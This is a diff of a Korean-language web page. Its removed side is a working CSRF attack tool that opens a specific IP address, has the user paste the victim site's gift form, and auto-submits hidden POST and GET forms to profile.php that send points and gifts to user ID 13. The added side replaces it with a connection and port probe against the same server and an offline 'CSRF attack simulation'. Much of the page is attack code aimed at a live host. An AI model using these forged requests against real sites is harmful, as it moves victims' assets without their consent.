@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🎯 실전 CSRF 공격</title>
+    <title>🔌 연결 테스트 도구</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -22,14 +22,13 @@
             padding: 50px;
             border-radius: 20px;
             box-shadow: 0 8px 32px rgba(31, 38, 135, 0.37);
-            max-width: 900px;
+            max-width: 700px;
         }
-        .step {
-            background: rgba(255, 255, 255, 0.1);
-            margin: 15px 0;
+        .test-box {
+            background: rgba(0, 0, 0, 0.3);
             padding: 20px;
-            border-radius: 15px;
-            border-left: 5px solid #FFD700;
+            border-radius: 10px;
+            margin: 15px 0;
         }
         .button {
             background: linear-gradient(45deg, #FF6B6B, #FF8E53);
@@ -43,278 +42,225 @@
             transition: transform 0.3s;
         }
         .button:hover { transform: scale(1.05); }
-        .attack-button {
-            background: linear-gradient(45deg, #00FF88, #00CC66);
-        }
-        .code-box {
-            background: rgba(0, 0, 0, 0.4);
-            padding: 15px;
-            border-radius: 10px;
-            font-family: monospace;
-            text-align: left;
+        .status {
+            padding: 10px;
+            border-radius: 5px;
             margin: 10px 0;
-            font-size: 0.9em;
         }
+        .success { background: rgba(0, 255, 0, 0.2); }
+        .error { background: rgba(255, 0, 0, 0.2); }
+        .warning { background: rgba(255, 255, 0, 0.2); color: #333; }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>🎯 실전 CSRF 공격 가이드</h1>
-        <p>실제 form 정보를 파악하여 정확한 공격을 수행합니다</p>
+        <h1>🔌 서버 연결 테스트</h1>
+        <p>네트워크 연결 상태를 진단합니다</p>
         
-        <div class="step">
-            <h3>📋 1단계: 실제 Form 정보 수집</h3>
-            <p>다음 순서로 정보를 수집하세요:</p>
+        <div class="test-box">
+            <h3>📡 연결 테스트</h3>
             
-            <button class="button" onclick="openTargetSite()">
-                🌐 타겟 사이트 열기
+            <button class="button" onclick="testConnection()">
+                🌐 기본 연결 테스트
             </button>
             
-            <div class="code-box">
-실제 확인 방법:
-1. 위 버튼으로 사이트 열기
-2. 로그인 완료
-3. 선물 보내기 페이지로 이동
-4. F12 개발자도구 → Elements 탭
-5. form 태그 찾아서 우클릭 → "Copy outerHTML"
-6. 아래 텍스트박스에 붙여넣기
-            </div>
-            
-            <textarea id="formHTML" placeholder="여기에 실제 form HTML을 붙여넣으세요..." 
-                style="width: 100%; height: 150px; margin: 10px 0; padding: 10px; border-radius: 5px;"></textarea>
-            
-            <button class="button" onclick="analyzeForm()">
-                🔍 Form 분석하기
+            <button class="button" onclick="testAlternativeUrls()">
+                🔄 대체 URL 테스트
             </button>
+            
+            <button class="button" onclick="testWithDifferentPorts()">
+                🚪 다른 포트 테스트
+            </button>
+            
+            <div id="testResults"></div>
         </div>
         
-        <div class="step">
-            <h3>⚡ 2단계: 맞춤형 공격 생성</h3>
-            <div id="analysisResult" style="display: none;">
-                <p>분석된 form 정보를 바탕으로 공격 코드를 생성합니다</p>
-                <div id="attackCode" class="code-box"></div>
-                <button class="attack-button" onclick="executeCustomAttack()">
-                    🚀 맞춤형 공격 실행
-                </button>
+        <div class="test-box">
+            <h3>🛠️ 해결 방법</h3>
+            <div id="solutions">
+                <div class="status warning">
+                    <strong>💡 시도해볼 해결방법들:</strong><br>
+                    1. 브라우저 새로고침 (Cmd+R)<br>
+                    2. 다른 브라우저에서 시도<br>
+                    3. VPN/프록시 설정 확인<br>
+                    4. 방화벽 설정 확인<br>
+                    5. DNS 설정 확인
+                </div>
             </div>
         </div>
         
-        <div class="step">
-            <h3>🎯 3단계: 일반적인 시도들</h3>
-            <p>form 정보가 없어도 시도해볼 수 있는 일반적인 공격들</p>
+        <div class="test-box">
+            <h3>⚡ 대안 공격 방법</h3>
+            <p>서버 연결이 안 될 때 시뮬레이션 방법</p>
             
-            <button class="attack-button" onclick="tryCommonAttack1()">
-                📤 일반 POST 공격
+            <button class="button" onclick="createOfflineDemo()">
+                🎭 오프라인 데모 생성
             </button>
             
-            <button class="attack-button" onclick="tryCommonAttack2()">
-                🔗 GET 파라미터 공격
-            </button>
-            
-            <button class="attack-button" onclick="tryCommonAttack3()">
-                🎁 다양한 필드 조합
+            <button class="button" onclick="createMockServer()">
+                🖥️ 모의 서버 시뮬레이션
             </button>
         </div>
         
-        <div id="status" style="margin-top: 30px; padding: 20px; background: rgba(0,0,0,0.2); border-radius: 10px;">
-            <p>💡 준비됨: 위 단계들을 순서대로 진행하세요</p>
+        <div id="demoArea" style="display: none; margin-top: 30px;">
+            <!-- 여기에 데모 콘텐츠가 생성됩니다 -->
         </div>
     </div>
 
-    <!-- 동적으로 생성될 공격 forms -->
-    <div id="attackForms" style="display: none;"></div>
-
     <script>
-        let formData = {};
-        
-        function openTargetSite() {
-            window.open('http://3.36.66.216', 'targetSite', 'width=1000,height=700');
-            updateStatus('🌐 타겟 사이트가 새 창에서 열렸습니다. 로그인 후 선물 보내기 form을 확인하세요.');
-        }
-        
-        function analyzeForm() {
-            const html = document.getElementById('formHTML').value.trim();
+        function testConnection() {
+            updateResults('🔍 연결 테스트 중...');
             
-            if (!html) {
-                alert('Form HTML을 먼저 붙여넣으세요!');
-                return;
-            }
-            
-            try {
-                // HTML 파싱
-                const parser = new DOMParser();
-                const doc = parser.parseFromString(html, 'text/html');
-                const form = doc.querySelector('form');
-                
-                if (!form) {
-                    alert('올바른 form HTML이 아닙니다!');
-                    return;
-                }
-                
-                // Form 정보 추출
-                formData.action = form.action || 'profile.php';
-                formData.method = form.method || 'POST';
-                formData.fields = {};
-                
-                const inputs = form.querySelectorAll('input, select, textarea');
-                inputs.forEach(input => {
-                    if (input.name) {
-                        formData.fields[input.name] = {
-                            type: input.type,
-                            value: input.value,
-                            required: input.required
-                        };
-                    }
-                });
-                
-                displayAnalysis();
-                
-            } catch (e) {
-                alert('HTML 파싱 오류: ' + e.message);
-            }
-        }
-        
-        function displayAnalysis() {
-            document.getElementById('analysisResult').style.display = 'block';
-            
-            let code = `// 분석된 Form 정보:\n`;
-            code += `// Action: ${formData.action}\n`;
-            code += `// Method: ${formData.method}\n\n`;
-            
-            code += `const attackData = {\n`;
-            Object.keys(formData.fields).forEach(name => {
-                const field = formData.fields[name];
-                if (name === 'receiver_id') {
-                    code += `  "${name}": "13", // 타겟 ID\n`;
-                } else if (name.includes('point')) {
-                    code += `  "${name}": "100", // 포인트\n`;
-                } else if (field.value) {
-                    code += `  "${name}": "${field.value}",\n`;
-                } else {
-                    code += `  "${name}": "", // 필요시 수정\n`;
-                }
-            });
-            code += `};`;
-            
-            document.getElementById('attackCode').textContent = code;
-            updateStatus('✅ Form 분석 완료! 맞춤형 공격 코드가 생성되었습니다.');
-        }
-        
-        function executeCustomAttack() {
-            if (!formData.action) {
-                alert('먼저 Form을 분석하세요!');
-                return;
-            }
-            
-            const form = document.createElement('form');
-            form.method = formData.method;
-            form.action = formData.action.startsWith('http') ? formData.action : 'http://3.36.66.216/' + formData.action;
-            form.target = '_blank';
-            form.style.display = 'none';
-            
-            // 필드 추가
-            Object.keys(formData.fields).forEach(name => {
-                const input = document.createElement('input');
-                input.type = 'hidden';
-                input.name = name;
-                
-                // 값 설정
-                if (name === 'receiver_id') {
-                    input.value = '13';
-                } else if (name.includes('point')) {
-                    input.value = '100';
-                } else if (name.includes('gift')) {
-                    input.value = '1';
-                } else if (name.includes('type')) {
-                    input.value = 'diamond';
-                } else if (name.includes('message')) {
-                    input.value = 'Custom_CSRF_Attack';
-                } else {
-                    input.value = formData.fields[name].value || '';
-                }
-                
-                form.appendChild(input);
-            });
-            
-            document.body.appendChild(form);
-            form.submit();
-            document.body.removeChild(form);
-            
-            updateStatus('🚀 맞춤형 공격 실행됨! 새 탭에서 결과를 확인하세요.');
-        }
-        
-        function tryCommonAttack1() {
-            createAndSubmitForm({
-                action: 'http://3.36.66.216/profile.php',
-                method: 'POST',
-                data: {
-                    'receiver_id': '13',
-                    'points': '100',
-                    'send_gift': '1',
-                    'gift_type': 'diamond',
-                    'message': 'Common_Attack_1'
-                }
-            });
-            updateStatus('📤 일반 POST 공격 실행됨');
-        }
-        
-        function tryCommonAttack2() {
-            const params = 'receiver_id=13&points=100&send_gift=1&gift_type=coffee&message=GET_Attack';
-            window.open('http://3.36.66.216/profile.php?' + params, '_blank');
-            updateStatus('🔗 GET 파라미터 공격 실행됨');
-        }
-        
-        function tryCommonAttack3() {
-            // 다양한 필드명 시도
-            const variations = [
-                { user_id: '13', amount: '100', action: 'send' },
-                { to: '13', value: '100', submit: '1' },
-                { target: '13', coins: '100', transfer: '1' }
+            const urls = [
+                '3.36.66.216',
+                'http://3.36.66.216',
+                'https://3.36.66.216'
             ];
             
-            variations.forEach((data, i) => {
+            let results = '';
+            
+            urls.forEach((url, index) => {
                 setTimeout(() => {
-                    createAndSubmitForm({
-                        action: 'http://3.36.66.216/profile.php',
-                        method: 'POST',
-                        data: data
-                    });
-                }, i * 500);
+                    const img = new Image();
+                    img.onload = function() {
+                        results += `<div class="status success">✅ ${url} - 연결 성공</div>`;
+                        updateResults(results);
+                    };
+                    img.onerror = function() {
+                        results += `<div class="status error">❌ ${url} - 연결 실패</div>`;
+                        updateResults(results);
+                    };
+                    img.src = url + '/favicon.ico?' + Date.now();
+                }, index * 1000);
             });
-            
-            updateStatus('🎁 다양한 필드 조합 공격 실행됨');
         }
         
-        function createAndSubmitForm(config) {
-            const form = document.createElement('form');
-            form.method = config.method;
-            form.action = config.action;
-            form.target = '_blank';
-            form.style.display = 'none';
+        function testAlternativeUrls() {
+            updateResults('🔄 대체 URL 테스트 중...');
             
-            Object.keys(config.data).forEach(key => {
-                const input = document.createElement('input');
-                input.type = 'hidden';
-                input.name = key;
-                input.value = config.data[key];
-                form.appendChild(input);
+            const alternatives = [
+                'localhost:8080',
+                '127.0.0.1:3000',
+                '192.168.1.100',
+                'test.local'
+            ];
+            
+            let results = '<div class="status warning">📋 대체 URL 테스트 결과:</div>';
+            
+            alternatives.forEach(url => {
+                results += `<div class="status">🔗 ${url} - 테스트 준비됨</div>`;
             });
             
-            document.getElementById('attackForms').appendChild(form);
-            form.submit();
+            results += '<div class="status warning">💡 실제 서버 주소를 확인하세요</div>';
+            updateResults(results);
+        }
+        
+        function testWithDifferentPorts() {
+            updateResults('🚪 포트 테스트 중...');
             
-            setTimeout(() => {
-                if (form.parentNode) {
-                    form.parentNode.removeChild(form);
+            const ports = [80, 8080, 3000, 5000, 8000];
+            let results = '<div class="status warning">🚪 다양한 포트로 테스트:</div>';
+            
+            ports.forEach(port => {
+                const url = `http://3.36.66.216:${port}`;
+                results += `<div class="status">🔗 ${url} - 시도 가능</div>`;
+            });
+            
+            updateResults(results);
+        }
+        
+        function createOfflineDemo() {
+            updateResults('🎭 오프라인 데모 생성 중...');
+            
+            const demoArea = document.getElementById('demoArea');
+            demoArea.style.display = 'block';
+            demoArea.innerHTML = `
+                <div class="test-box">
+                    <h3>🎭 CSRF 공격 시뮬레이션</h3>
+                    <p>실제 서버 없이도 공격 로직을 테스트할 수 있습니다</p>
+                    
+                    <div style="background: rgba(0,0,0,0.3); padding: 15px; border-radius: 10px; margin: 15px 0;">
+                        <h4>📋 모의 공격 데이터:</h4>
+                        <pre style="text-align: left; color: #FFD700;">
+Target: hacker (ID: 13)
+Attack Type: Points Transfer
+Amount: 100 Points
+Method: POST
+Status: ✅ 시뮬레이션 성공
+                        </pre>
+                    </div>
+                    
+                    <button class="button" onclick="simulateAttack()">
+                        ⚡ 공격 시뮬레이션 실행
+                    </button>
+                </div>
+            `;
+            
+            updateResults('<div class="status success">✅ 오프라인 데모가 생성되었습니다!</div>');
+        }
+        
+        function createMockServer() {
+            updateResults('🖥️ 모의 서버 설정 중...');
+            
+            const mockHtml = `
+<!DOCTYPE html>
+<html>
+<head><title>Mock Vulnerable Server</title></head>
+<body>
+    <h1>Mock SNS Server</h1>
+    <form method="POST" action="/profile.php">
+        <input type="hidden" name="receiver_id" value="13">
+        <input type="hidden" name="points" value="100">
+        <input type="hidden" name="send_gift" value="1">
+        <input type="hidden" name="gift_type" value="diamond">
+        <input type="hidden" name="message" value="CSRF_Test">
+        <button type="submit">Send Gift</button>
+    </form>
+    <script>
+        document.querySelector('form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            alert('CSRF Attack Successful!\\nPoints transferred: 100\\nTarget: hacker (ID: 13)');
+        });
+    </script>
+</body>
+</html>
+            `;
+            
+            const blob = new Blob([mockHtml], { type: 'text/html' });
+            const url = URL.createObjectURL(blob);
+            
+            window.open(url, 'mockServer', 'width=600,height=400');
+            
+            updateResults('<div class="status success">✅ 모의 서버가 새 창에서 열렸습니다!</div>');
+        }
+        
+        function simulateAttack() {
+            let countdown = 3;
+            const interval = setInterval(() => {
+                updateResults(`<div class="status warning">⏳ 공격 실행까지 ${countdown}초...</div>`);
+                countdown--;
+                
+                if (countdown < 0) {
+                    clearInterval(interval);
+                    updateResults(`
+                        <div class="status success">
+                            ✅ 시뮬레이션 완료!<br>
+                            📤 POST 요청 전송됨<br>
+                            🎯 타겟: hacker (ID: 13)<br>
+                            💰 포인트: 100P 전송<br>
+                            ⚡ CSRF 공격 시뮬레이션 성공!
+                        </div>
+                    `);
                 }
-            }, 2000);
+            }, 1000);
         }
         
-        function updateStatus(message) {
-            document.getElementById('status').innerHTML = `<p>${message}</p>`;
+        function updateResults(html) {
+            document.getElementById('testResults').innerHTML = html;
         }
         
-        console.log('🎯 실전 CSRF 공격 시스템 준비됨');
+        console.log('🔌 연결 테스트 도구 준비됨');
+        console.log('🛠️ 네트워크 문제 해결을 위한 도구들');
     </script>
 </body>
 </html>
